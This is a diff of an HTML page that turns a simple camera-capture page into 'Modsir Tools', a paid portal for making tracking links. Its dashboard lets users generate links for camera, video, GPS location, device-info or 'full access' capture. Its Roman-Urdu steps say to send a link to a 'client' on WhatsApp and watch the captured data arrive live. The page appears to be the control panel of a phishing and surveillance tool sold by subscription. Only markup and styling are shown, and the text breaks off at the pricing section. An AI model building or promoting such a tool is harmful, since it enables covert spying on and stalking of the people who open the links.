@@ -2,772 +2,673 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Camera Portal</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Modsir Tools</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
-  body {
-    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-    min-height: 100vh;
-    color: #fff;
-    padding: 20px;
-    overflow-x: hidden;
-  }
-  .container { max-width: 900px; margin: auto; }
-  .hidden { display: none !important; }
-
-  header { text-align:center; margin-bottom: 20px; }
-  header h1 { font-size: 1.8rem; margin-bottom: 6px; }
-  header p { opacity: 0.7; font-size: 0.9rem; }
-
-  .card {
-    background: rgba(255,255,255,0.08);
-    backdrop-filter: blur(12px);
-    border: 1px solid rgba(255,255,255,0.15);
-    border-radius: 16px;
-    padding: 25px;
-    margin-bottom: 20px;
-    box-shadow: 0 8px 30px rgba(0,0,0,0.35);
-  }
-  .card h2 { margin-bottom: 15px; font-size: 1.2rem; color:#00d4ff; }
-
-  /* ===== CAMERA VIEW ===== */
-  #cameraView { text-align: center; }
-  .video-wrapper {
-    position: relative;
-    width: 100%;
-    max-width: 500px;
-    margin: 0 auto 20px;
-    border-radius: 16px;
-    overflow: hidden;
-    background: #000;
-    aspect-ratio: 4/3;
-    border: 3px solid rgba(0,212,255,0.4);
-    box-shadow: 0 0 40px rgba(0,212,255,0.3);
-  }
-  #video {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    display: block;
-    transform: scaleX(-1); /* mirror */
-  }
-  .camera-hint {
-    position: absolute;
-    bottom: 12px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(0,0,0,0.6);
-    padding: 8px 18px;
-    border-radius: 20px;
-    font-size: 0.85rem;
-    backdrop-filter: blur(6px);
-  }
-
-  .capture-btn {
-    width: 80px;
-    height: 80px;
-    border-radius: 50%;
-    background: linear-gradient(135deg, #00d4ff, #00ffb3);
-    border: 5px solid rgba(255,255,255,0.3);
-    cursor: pointer;
-    transition: 0.2s;
-    margin: 10px auto;
-    display: block;
-    position: relative;
-    box-shadow: 0 0 30px rgba(0,212,255,0.5);
-  }
-  .capture-btn:hover { transform: scale(1.08); }
-  .capture-btn:active { transform: scale(0.95); }
-  .capture-btn::after {
-    content: '';
-    position: absolute;
-    inset: 8px;
-    border-radius: 50%;
-    background: rgba(255,255,255,0.3);
-  }
-
-  /* ===== PREVIEW VIEW ===== */
-  #previewView { text-align: center; }
-  #previewImg {
-    width: 100%;
-    max-width: 400px;
-    border-radius: 16px;
-    border: 3px solid #00ffb3;
-    box-shadow: 0 0 40px rgba(0,255,179,0.4);
-    margin-bottom: 20px;
-  }
-  .btn-row { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
-  button {
-    padding: 13px 26px;
-    border: none;
-    border-radius: 10px;
-    font-weight: bold;
-    font-size: 1rem;
-    cursor: pointer;
-    transition: 0.25s;
-    font-family: inherit;
-  }
-  button:hover { transform: translateY(-2px); }
-  button.primary { background: linear-gradient(90deg, #00d4ff, #00ffb3); color: #000; }
-  button.secondary { background: rgba(255,255,255,0.15); color: #fff; border: 1px solid rgba(255,255,255,0.3); }
-  button.danger { background: #ff4d4d; color: #fff; }
-  button.small { padding: 8px 16px; font-size: 0.85rem; }
-
-  /* ===== SUCCESS VIEW ===== */
-  #successView { text-align: center; padding: 40px 20px; }
-  .check-circle {
-    width: 100px;
-    height: 100px;
-    border-radius: 50%;
-    background: linear-gradient(135deg, #00ffb3, #00d4ff);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 0 auto 20px;
-    font-size: 3.5rem;
-    color: #000;
-    animation: pop 0.5s ease;
-  }
-  @keyframes pop {
-    0% { transform: scale(0); }
-    70% { transform: scale(1.15); }
-    100% { transform: scale(1); }
-  }
-
-  /* ===== ADMIN PANEL ===== */
-  #adminLoginView, #adminPanelView { max-width: 900px; margin: auto; }
-
-  .secret-input {
-    font-size: 2rem;
-    text-align: center;
-    letter-spacing: 20px;
-    padding: 20px;
-    background: rgba(0,0,0,0.4);
-    border: 2px solid rgba(0,212,255,0.4);
-    border-radius: 12px;
-    color: #00d4ff;
-    width: 100%;
-    max-width: 320px;
-    display: block;
-    margin: 0 auto 20px;
-    font-weight: bold;
-    font-family: monospace;
-  }
-  .secret-input:focus { outline: none; border-color: #00d4ff; box-shadow: 0 0 25px rgba(0,212,255,0.5); }
-
-  input[type="text"], input[type="search"] {
-    width: 100%;
-    padding: 12px 14px;
-    border-radius: 8px;
-    border: 1px solid rgba(255,255,255,0.2);
-    background: rgba(255,255,255,0.08);
-    color: #fff;
-    font-size: 1rem;
-    outline: none;
-    margin-bottom: 12px;
-  }
-  input::placeholder { color: rgba(255,255,255,0.5); }
-
-  .stats { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 20px; }
-  .stat-box {
-    flex: 1; min-width: 120px;
-    background: rgba(0,212,255,0.12);
-    border: 1px solid rgba(0,212,255,0.3);
-    border-radius: 10px;
-    padding: 15px;
-    text-align: center;
-  }
-  .stat-box h3 { font-size: 1.6rem; color: #00d4ff; }
-  .stat-box p { font-size: 0.75rem; opacity: 0.8; }
-
-  /* User cards with photos */
-  .photo-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-    gap: 15px;
-    margin-top: 15px;
-  }
-  .photo-card {
-    background: rgba(255,255,255,0.06);
-    border: 1px solid rgba(255,255,255,0.12);
-    border-radius: 12px;
-    overflow: hidden;
-    transition: 0.25s;
-  }
-  .photo-card:hover { transform: translateY(-4px); border-color: #00d4ff; }
-  .photo-card img {
-    width: 100%;
-    aspect-ratio: 4/3;
-    object-fit: cover;
-    display: block;
-    background: #000;
-  }
-  .photo-info {
-    padding: 10px 12px;
-    font-size: 0.8rem;
-    line-height: 1.5;
-  }
-  .photo-info .time { opacity: 0.55; font-size: 0.72rem; margin-top: 4px; }
-  .photo-actions { padding: 0 12px 12px; }
-  .photo-actions button {
-    width: 100%;
-    padding: 8px;
-    font-size: 0.8rem;
-  }
-
-  /* Toast */
-  .toast {
-    position: fixed; top: 20px; right: 20px;
-    background: #00ffb3; color: #000;
-    padding: 14px 22px; border-radius: 10px;
-    font-weight: bold;
-    box-shadow: 0 6px 25px rgba(0,255,179,0.5);
-    opacity: 0; transform: translateX(120%);
-    transition: 0.4s; z-index: 9999;
-    max-width: 90vw;
-  }
-  .toast.show { opacity: 1; transform: translateX(0); }
-  .toast.error { background:#ff4d4d; color:#fff; }
-
-  .flash {
-    position: fixed;
-    inset: 0;
-    background: #fff;
-    opacity: 0;
-    pointer-events: none;
-    z-index: 9998;
-    transition: opacity 0.15s;
-  }
-  .flash.active { opacity: 0.85; }
-
-  .loading {
-    text-align: center;
-    padding: 40px 20px;
-  }
-  .spinner {
-    width: 50px; height: 50px;
-    border: 4px solid rgba(0,212,255,0.2);
-    border-top-color: #00d4ff;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    margin: 0 auto 20px;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-
-  @media (max-width: 600px) {
-    header h1 { font-size: 1.4rem; }
-    .card { padding: 18px; }
-    .photo-grid { grid-template-columns: 1fr 1fr; }
-  }
+  :root{--bg-0:#05070f;--accent:#22d3ee;--accent-2:#a855f7;--accent-3:#10b981;--gold:#fbbf24;--danger:#ef4444;--text:#fff;--text-dim:rgba(255,255,255,0.6);--glass:rgba(255,255,255,0.04);--glass-2:rgba(255,255,255,0.08);--border:rgba(255,255,255,0.08);--border-2:rgba(255,255,255,0.15);}
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+  html,body{height:100%;overflow-x:hidden;}
+  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg-0);color:var(--text);min-height:100vh;-webkit-font-smoothing:antialiased;position:relative;}
+  body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 15% 0%,rgba(168,85,247,0.4) 0%,transparent 50%),radial-gradient(ellipse at 85% 100%,rgba(34,211,238,0.35) 0%,transparent 50%);z-index:-2;animation:bgFloat 25s ease-in-out infinite;}
+  @keyframes bgFloat{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+  .container{max-width:960px;margin:0 auto;padding:20px 18px 40px;}
+  .hidden{display:none !important;}
+  .navbar{position:sticky;top:0;z-index:100;background:rgba(5,7,15,0.75);backdrop-filter:blur(24px);border-bottom:1px solid var(--border);padding:12px 18px;display:flex;justify-content:space-between;align-items:center;}
+  .brand{display:flex;align-items:center;gap:11px;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1.05rem;}
+  .brand-logo{width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:1.15rem;box-shadow:0 8px 24px rgba(34,211,238,0.35);}
+  .brand-text{display:flex;flex-direction:column;line-height:1.1;}
+  .brand-text small{font-size:0.6rem;font-weight:500;letter-spacing:0.15em;text-transform:uppercase;color:var(--accent);opacity:0.9;}
+  .nav-user{display:flex;align-items:center;gap:10px;font-size:0.85rem;}
+  .nav-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-weight:700;color:#000;font-size:0.85rem;font-family:'Space Grotesk',sans-serif;object-fit:cover;}
+  .plan-badge{padding:4px 10px;border-radius:20px;font-size:0.65rem;font-weight:700;letter-spacing:0.05em;text-transform:uppercase;}
+  .plan-badge.trial{background:rgba(148,163,184,0.15);color:#cbd5e1;border:1px solid rgba(148,163,184,0.3);}
+  .plan-badge.pro{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;}
+  .card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:22px;padding:24px;margin-bottom:18px;box-shadow:0 20px 50px rgba(0,0,0,0.4);}
+  .card h2{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
+  button{padding:13px 22px;border-radius:12px;font-weight:600;font-size:0.92rem;cursor:pointer;transition:all 0.25s;font-family:inherit;border:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;}
+  button:active:not(:disabled){transform:scale(0.97);}
+  button:disabled{opacity:0.4;cursor:not-allowed;}
+  button.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;box-shadow:0 8px 24px rgba(34,211,238,0.4);}
+  button.secondary{background:var(--glass-2);color:#fff;border:1px solid var(--border-2);}
+  button.danger{background:rgba(239,68,68,0.15);color:#fca5a5;border:1px solid rgba(239,68,68,0.35);}
+  button.whatsapp{background:linear-gradient(135deg,#25d366,#128c7e);color:#fff;box-shadow:0 8px 24px rgba(37,211,102,0.4);font-weight:700;}
+  button.google-btn{background:#fff;color:#000;font-weight:600;border:1px solid rgba(0,0,0,0.1);}
+  button.google-btn:hover{background:#f5f5f5;}
+  button.small{padding:9px 14px;font-size:0.8rem;}
+  button.block{width:100%;}
+  input{width:100%;padding:14px 16px;border-radius:12px;border:1px solid var(--border-2);background:rgba(0,0,0,0.3);color:#fff;font-size:0.95rem;outline:none;margin-bottom:14px;font-family:inherit;transition:0.2s;}
+  input:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(34,211,238,0.15);}
+  input::placeholder{color:rgba(255,255,255,0.4);}
+  label{display:block;font-size:0.8rem;margin-bottom:6px;opacity:0.75;font-weight:600;}
+  .hero{text-align:center;padding:36px 20px 26px;}
+  .hero-icon{width:92px;height:92px;border-radius:26px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:2.8rem;margin:0 auto 22px;box-shadow:0 24px 60px rgba(34,211,238,0.4);animation:heroFloat 3.5s ease-in-out infinite;}
+  @keyframes heroFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
+  .hero h1{font-family:'Space Grotesk',sans-serif;font-size:2rem;margin-bottom:10px;background:linear-gradient(135deg,#fff 0%,#22d3ee 60%,#a855f7 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+  .hero p{opacity:0.7;font-size:0.92rem;line-height:1.55;max-width:380px;margin:0 auto;}
+  .pricing-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:18px;}
+  @media (max-width:640px){.pricing-grid{grid-template-columns:1fr;}}
+  .price-card{background:var(--glass);border:1px solid var(--border);border-radius:20px;padding:24px 20px;position:relative;overflow:hidden;}
+  .price-card.pro-card{background:linear-gradient(160deg,rgba(251,191,36,0.1),rgba(168,85,247,0.1));border:1.5px solid rgba(251,191,36,0.5);}
+  .price-card.pro-card::before{content:'POPULAR';position:absolute;top:14px;right:-32px;background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;font-size:0.6rem;font-weight:800;letter-spacing:0.1em;padding:4px 40px;transform:rotate(45deg);}
+  .price-icon{width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:1.4rem;margin-bottom:14px;}
+  .price-icon.free{background:rgba(148,163,184,0.15);}
+  .price-icon.pro{background:linear-gradient(135deg,var(--gold),#f59e0b);color:#000;}
+  .price-title{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;font-weight:700;margin-bottom:4px;}
+  .price-amount{font-family:'Space Grotesk',sans-serif;font-size:1.8rem;font-weight:700;margin-bottom:4px;}
+  .price-amount span{font-size:0.85rem;opacity:0.6;font-weight:500;}
+  .price-desc{font-size:0.8rem;opacity:0.65;margin-bottom:16px;}
+  .price-features{list-style:none;margin-bottom:18px;}
+  .price-features li{font-size:0.82rem;padding:6px 0;display:flex;align-items:center;gap:8px;opacity:0.85;}
+  .price-features li::before{content:'✓';color:var(--accent-3);font-weight:700;}
+  .price-features li.off{opacity:0.35;}
+  .price-features li.off::before{content:'✕';color:var(--danger);}
+  .usage-bar{background:rgba(0,0,0,0.35);border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid var(--border);}
+  .usage-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;font-size:0.82rem;}
+  .usage-header .count{font-weight:700;font-family:'Space Grotesk',sans-serif;}
+  .usage-header .count.warn{color:var(--gold);}
+  .usage-header .count.danger{color:var(--danger);}
+  .usage-track{height:8px;border-radius:10px;background:rgba(255,255,255,0.08);overflow:hidden;}
+  .usage-fill{height:100%;border-radius:10px;background:linear-gradient(90deg,var(--accent-3),var(--accent));transition:width 0.5s;}
+  .usage-fill.warn{background:linear-gradient(90deg,var(--gold),#f97316);}
+  .usage-fill.danger{background:linear-gradient(90deg,var(--danger),#dc2626);}
+  .feature-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;}
+  .feature-btn{background:var(--glass);border:1px solid var(--border);border-radius:18px;padding:22px 14px;cursor:pointer;transition:0.25s;text-align:center;color:#fff;display:flex;flex-direction:column;align-items:center;gap:10px;font-family:inherit;}
+  .feature-btn:hover:not(:disabled){background:var(--glass-2);border-color:var(--accent);transform:translateY(-5px);}
+  .feature-btn:disabled{opacity:0.5;cursor:not-allowed;}
+  .feature-btn .fb-icon{width:54px;height:54px;border-radius:15px;background:linear-gradient(135deg,rgba(34,211,238,0.15),rgba(168,85,247,0.15));border:1px solid rgba(34,211,238,0.25);display:flex;align-items:center;justify-content:center;font-size:1.6rem;}
+  .feature-btn .fb-title{font-weight:700;font-size:0.92rem;font-family:'Space Grotesk',sans-serif;}
+  .feature-btn .fb-desc{font-size:0.7rem;opacity:0.55;}
+  .link-output{background:linear-gradient(135deg,rgba(34,211,238,0.08),rgba(168,85,247,0.08));border:1px solid rgba(34,211,238,0.3);border-radius:16px;padding:18px;margin-top:16px;}
+  .link-output .lo-label{font-size:0.72rem;text-transform:uppercase;letter-spacing:0.1em;opacity:0.8;margin-bottom:10px;font-weight:700;color:var(--accent);}
+  .link-row{display:flex;gap:10px;}
+  .link-row input{margin:0;font-size:0.82rem;font-family:'Space Grotesk',monospace;background:rgba(0,0,0,0.5);}
+  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:12px;}
+  .stat-box{background:linear-gradient(160deg,rgba(34,211,238,0.08),rgba(168,85,247,0.08));border:1px solid rgba(34,211,238,0.2);border-radius:16px;padding:16px 12px;text-align:center;}
+  .stat-box h3{font-family:'Space Grotesk',sans-serif;font-size:1.65rem;color:var(--accent);}
+  .stat-box p{font-size:0.68rem;opacity:0.65;text-transform:uppercase;letter-spacing:0.06em;}
+  .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;}
+  .media-card{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:16px;overflow:hidden;transition:0.25s;}
+  .media-card:hover{border-color:var(--accent);transform:translateY(-4px);}
+  .media-card img{width:100%;aspect-ratio:1;object-fit:cover;display:block;background:#000;cursor:pointer;}
+  .media-info{padding:10px 12px;font-size:0.72rem;line-height:1.5;}
+  .media-info .row{display:flex;gap:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;opacity:0.85;}
+  .media-info .time{opacity:0.5;font-size:0.66rem;margin-top:4px;}
+  .media-actions{padding:0 10px 10px;}
+  .media-actions button{width:100%;padding:8px;font-size:0.72rem;}
+  .profile-header{display:flex;align-items:center;gap:16px;padding:16px 0;margin-bottom:8px;}
+  .profile-avatar{width:66px;height:66px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-weight:700;font-size:1.5rem;color:#000;font-family:'Space Grotesk',sans-serif;overflow:hidden;}
+  .profile-avatar img{width:100%;height:100%;object-fit:cover;}
+  .profile-info h2{font-family:'Space Grotesk',sans-serif;font-size:1.1rem;margin-bottom:3px;}
+  .profile-info p{font-size:0.8rem;opacity:0.6;}
+  .toast{position:fixed;top:80px;right:16px;left:16px;max-width:400px;margin-left:auto;background:linear-gradient(135deg,var(--accent-3),#059669);color:#fff;padding:14px 18px;border-radius:14px;font-weight:600;font-size:0.88rem;box-shadow:0 16px 40px rgba(16,185,129,0.5);opacity:0;transform:translateY(-24px);transition:all 0.4s cubic-bezier(0.34,1.56,0.64,1);z-index:1000;pointer-events:none;line-height:1.4;}
+  .toast.show{opacity:1;transform:translateY(0);}
+  .toast.error{background:linear-gradient(135deg,var(--danger),#b91c1c);box-shadow:0 16px 40px rgba(239,68,68,0.5);}
+  .toast.info{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;}
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,0.96);display:none;align-items:center;justify-content:center;z-index:500;padding:20px;}
+  .modal.active{display:flex;}
+  .modal-content{max-width:100%;max-height:90vh;border-radius:16px;overflow:hidden;}
+  .modal-content img{max-width:100%;max-height:90vh;display:block;border-radius:16px;}
+  .modal-close{position:absolute;top:16px;right:16px;width:44px;height:44px;border-radius:12px;background:rgba(255,255,255,0.15);color:#fff;font-size:1.3rem;border:1px solid rgba(255,255,255,0.25);cursor:pointer;}
+  .spinner{width:44px;height:44px;border:4px solid rgba(34,211,238,0.15);border-top-color:var(--accent);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 16px;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .tabs{display:flex;gap:6px;background:rgba(0,0,0,0.4);border-radius:14px;padding:6px;margin-bottom:20px;border:1px solid var(--border);}
+  .tab{flex:1;padding:11px;border-radius:10px;background:transparent;border:none;color:var(--text-dim);font-weight:600;font-size:0.88rem;cursor:pointer;transition:0.25s;font-family:inherit;}
+  .tab.active{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;}
+  .divider{display:flex;align-items:center;gap:10px;margin:18px 0;}
+  .divider .line{flex:1;height:1px;background:rgba(255,255,255,0.1);}
+  .divider .text{font-size:0.72rem;opacity:0.5;font-weight:500;}
+  .info-box{background:linear-gradient(135deg,rgba(34,211,238,0.08),rgba(168,85,247,0.08));border:1px solid rgba(34,211,238,0.25);border-radius:14px;padding:16px;font-size:0.82rem;line-height:1.55;margin-bottom:14px;}
+  .info-box b{color:var(--accent);}
+  .how-to-use{background:linear-gradient(135deg,rgba(16,185,129,0.08),rgba(34,211,238,0.08));border:1px solid rgba(16,185,129,0.3);border-radius:16px;padding:18px;margin-bottom:18px;font-size:0.85rem;line-height:1.7;}
+  .how-to-use h3{font-family:'Space Grotesk',sans-serif;font-size:0.95rem;margin-bottom:10px;color:var(--accent-3);display:flex;align-items:center;gap:8px;}
+  .how-to-use ol{padding-left:20px;}
+  .how-to-use li{margin-bottom:6px;opacity:0.85;}
+  @media (max-width:480px){.hero h1{font-size:1.55rem;}.card{padding:18px;border-radius:18px;}.feature-grid{grid-template-columns:repeat(2,1fr);gap:10px;}.media-grid{grid-template-columns:repeat(2,1fr);}.feature-btn{padding:18px 10px;}.feature-btn .fb-icon{width:46px;height:46px;font-size:1.35rem;}}
 </style>
 </head>
 <body>
 
-<!-- ========== CAMERA VIEW ========== -->
-<div id="cameraView" class="hidden">
-  <div class="container">
-    <header>
-      <h1>📷 Photo Capture</h1>
-      <p>Click the button to take your photo</p>
-    </header>
-    <div class="card">
-      <div class="video-wrapper">
-        <video id="video" autoplay playsinline muted></video>
-        <div class="camera-hint">👆 Button dabao photo lene ke liye</div>
+<div class="toast" id="toast"></div>
+
+<div class="navbar">
+  <div class="brand">
+    <div class="brand-logo">⚡</div>
+    <div class="brand-text"><span>Modsir Tools</span><small>Pro Portal</small></div>
+  </div>
+  <div class="nav-user" id="navUser"></div>
+</div>
+
+<div id="loadingView" class="container" style="text-align:center;padding-top:100px;">
+  <div class="spinner"></div>
+  <p style="opacity:0.6;font-size:0.9rem;">Loading...</p>
+</div>
+
+<div id="authView" class="container hidden">
+  <div class="hero">
+    <div class="hero-icon">⚡</div>
+    <h1>Modsir Tools</h1>
+    <p>Professional tools portal. Register karo, links banao, aur data securely collect karo.</p>
+  </div>
+  <div class="card">
+    <div class="tabs">
+      <button class="tab active" id="tabLogin" onclick="switchAuth('login')">Login</button>
+      <button class="tab" id="tabRegister" onclick="switchAuth('register')">Register</button>
+    </div>
+    <div id="loginForm">
+      <label>Email</label>
+      <input type="email" id="loginEmail" placeholder="your@email.com">
+      <label>Password</label>
+      <input type="password" id="loginPass" placeholder="••••••••">
+      <button class="primary block" onclick="doLogin()" id="loginBtn">🔓 Login</button>
+      <div class="divider"><div class="line"></div><div class="text">OR</div><div class="line"></div></div>
+      <button class="google-btn block" onclick="doGoogleLogin()">
+        <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.9 29.3 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.1 6.1 29.3 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.2-.1-2.4-.4-3.5z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.1 6.1 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.1-11.3-7.5l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.3-2.3 4.2-4.1 5.6l6.2 5.2c-.4.4 6.6-4.8 6.6-14.8 0-1.2-.1-2.4-.4-3.5z"/></svg>
+        Continue with Google
+      </button>
+    </div>
+    <div id="registerForm" class="hidden">
+      <label>Full Name</label>
+      <input type="text" id="regName" placeholder="Aapka naam">
+      <label>Email</label>
+      <input type="email" id="regEmail" placeholder="your@email.com">
+      <label>Password (min 6 chars)</label>
+      <input type="password" id="regPass" placeholder="••••••••">
+      <button class="primary block" onclick="doRegister()" id="regBtn">✨ Create Free Account</button>
+      <div class="divider"><div class="line"></div><div class="text">OR</div><div class="line"></div></div>
+      <button class="google-btn block" onclick="doGoogleLogin()">
+        <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.9 29.3 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.1 6.1 29.3 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.2-.1-2.4-.4-3.5z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.1 6.1 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.1-11.3-7.5l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.3-2.3 4.2-4.1 5.6l6.2 5.2c-.4.4 6.6-4.8 6.6-14.8 0-1.2-.1-2.4-.4-3.5z"/></svg>
+        Sign up with Google
+      </button>
+      <p style="font-size:0.72rem;opacity:0.55;margin-top:12px;text-align:center;line-height:1.5;">Free account me <b>3 links</b> bana sakte ho. Unlimited ke liye Pro me upgrade karo.</p>
+    </div>
+  </div>
+</div>
+
+<div id="dashboardView" class="container hidden">
+  <div class="profile-header">
+    <div class="profile-avatar" id="dashAvatar">U</div>
+    <div class="profile-info" style="flex:1;">
+      <h2 id="dashName">User</h2>
+      <p id="dashEmail">user@email.com</p>
+    </div>
+    <div id="planIndicator"></div>
+    <button class="secondary small" style="margin-left:12px;" onclick="doLogout()">Exit</button>
+  </div>
+
+  <div class="how-to-use">
+    <h3>📖 Kaise Use Karein</h3>
+    <ol>
+      <li>Neeche se koi feature select karo (Camera, Location, etc.)</li>
+      <li>Unique link generate hoga</li>
+      <li>Link copy karke client ko bhejo (WhatsApp/Email)</li>
+      <li>Client link kholega → permission dega → data aapke paas aayega</li>
+      <li>Captured data neeche "Captured Data" section me live dikhega</li>
+    </ol>
+  </div>
+
+  <div class="card">
+    <h2>📊 Your Plan</h2>
+    <div id="usageContent"></div>
+  </div>
+
+  <div class="card">
+    <h2>🎯 Create Link</h2>
+    <p style="opacity:0.65;font-size:0.82rem;margin-bottom:16px;line-height:1.5;">Feature select karo → link generate hoga → client ko bhejo.</p>
+    <div class="feature-grid" id="featureGrid">
+      <button class="feature-btn" onclick="generateLink('camera')"><div class="fb-icon">📷</div><div class="fb-title">Camera</div><div class="fb-desc">Photo capture</div></button>
+      <button class="feature-btn" onclick="generateLink('video')"><div class="fb-icon">🎥</div><div class="fb-title">Video</div><div class="fb-desc">Video recording</div></button>
+      <button class="feature-btn" onclick="generateLink('location')"><div class="fb-icon">📍</div><div class="fb-title">Location</div><div class="fb-desc">GPS tracking</div></button>
+      <button class="feature-btn" onclick="generateLink('device')"><div class="fb-icon">📱</div><div class="fb-title">Device Info</div><div class="fb-desc">Phone details</div></button>
+      <button class="feature-btn" onclick="generateLink('all')"><div class="fb-icon">⚡</div><div class="fb-title">Full Access</div><div class="fb-desc">Sab kuch</div></button>
+    </div>
+    <div id="linkOutput" class="link-output hidden">
+      <div class="lo-label" id="linkLabel">Generated Link</div>
+      <div class="link-row">
+        <input type="text" id="generatedLink" readonly>
+        <button class="primary small" onclick="copyGeneratedLink()">📋 Copy</button>
       </div>
-      <button class="capture-btn" onclick="capturePhoto()" title="Capture"></button>
-      <p style="opacity:0.6; font-size:0.85rem; margin-top:10px;">Tap to capture</p>
     </div>
+  </div>
+
+  <div class="card">
+    <h2>📈 Stats</h2>
+    <div class="stats">
+      <div class="stat-box"><h3 id="sTotal">0</h3><p>Total</p></div>
+      <div class="stat-box"><h3 id="sToday">0</h3><p>Today</p></div>
+      <div class="stat-box"><h3 id="sPhoto">0</h3><p>Photos</p></div>
+      <div class="stat-box"><h3 id="sVideo">0</h3><p>Videos</p></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>🖼️ Captured Data <span style="font-size:0.7rem;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;padding:3px 10px;border-radius:20px;font-weight:700;margin-left:auto;" id="liveIndicator">🔴 LIVE</span></h2>
+    <input type="search" id="searchBox" placeholder="🔍 Search..." oninput="renderMedia()">
+    <div id="mediaGrid" class="media-grid"></div>
   </div>
 </div>
 
-<!-- ========== PREVIEW VIEW ========== -->
-<div id="previewView" class="hidden">
-  <div class="container">
-    <header><h1>✅ Photo Ready</h1></header>
-    <div class="card">
-      <img id="previewImg" alt="preview">
-      <div class="btn-row">
-        <button class="secondary" onclick="retakePhoto()">🔄 Retake</button>
-        <button class="primary" onclick="submitPhoto()">📤 Submit</button>
-      </div>
+<div id="upgradeView" class="container hidden">
+  <div class="hero" style="padding:20px 0;">
+    <div class="hero-icon" style="background:linear-gradient(135deg,var(--gold),#f59e0b);">👑</div>
+    <h1>Upgrade to Pro</h1>
+    <p>Unlimited links. Unlimited data. Unlimited reach.</p>
+  </div>
+  <div class="pricing-grid">
+    <div class="price-card">
+      <div class="price-icon free">🆓</div>
+      <div class="price-title">Free Trial</div>
+      <div class="price-amount">0 <span>PKR</span></div>
+      <div class="price-desc">Try karo, 3 links banao</div>
+      <ul class="price-features">
